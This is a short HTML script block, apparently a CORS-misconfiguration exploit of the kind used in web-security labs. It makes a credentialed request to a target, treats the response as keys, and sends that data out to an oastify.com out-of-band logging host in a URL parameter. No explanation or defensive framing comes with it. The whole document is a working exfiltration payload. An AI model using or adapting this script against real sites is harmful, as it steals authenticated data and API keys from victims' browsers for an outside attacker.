<script>
var req = new XMLHttpRequest();
var url = "https://127.0.0.1";

req.onload = retrieveKeys;
req.open('GET', url, true);
req.withCredentials = true;
req.send(null);

function retrieveKeys() {
    var responseData = this.responseText; // Corrected variable name
    sendDataToOtherServer(responseData);
}

function sendDataToOtherServer(data) {
    var otherServerUrl = "https://nnefz89vu9pelpqh9zggijwkxb3ar0fp.oastify.com/log?key=" + data;
    
    var reqOtherServer = new XMLHttpRequest();
    reqOtherServer.open('GET', otherServerUrl, true);
    reqOtherServer.send(null);
}
</script>
